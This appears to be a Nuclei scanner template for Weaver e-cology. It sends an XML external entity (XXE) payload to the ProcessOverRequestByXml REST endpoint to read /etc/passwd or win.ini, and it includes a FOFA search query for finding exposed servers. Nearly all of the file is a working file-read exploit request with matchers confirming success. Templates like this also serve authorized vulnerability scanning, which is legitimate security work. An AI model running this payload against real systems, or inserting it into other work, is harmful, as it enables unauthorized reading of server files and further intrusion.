id: e-cology-ProcessOverRequestByXml-lfi

info:
  name: e-cology-ProcessOverRequestByXml-lfi
  author: y0lk
  severity: high
  description: 
  tags: lfi
  metadata:
    fofa-qeury: body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"
    veified: true
    max-request: 1

http:
  - raw:
      - |              
       POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
       Accept-Encoding: gzip, deflate
       Accept: */*
       Connection: close
       Host:
       Content-Type: application/xml
       Content-Length: 139

       <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///{{path}}">]><reset><syscode>&test;</syscode></reset>

    payloads:
     path:
      - /etc/passwd
      - c:/windows/win.ini

    attack: batteringram

    matchers-condition: or 
    matchers:
      - type: dsl
        name: linux
        dsl:
          - "status_code == 200 && contains(body,'root:x')"

      - type: dsl
        name: windows
        dsl:
          - "status_code == 200 && contains(body,'extensions')"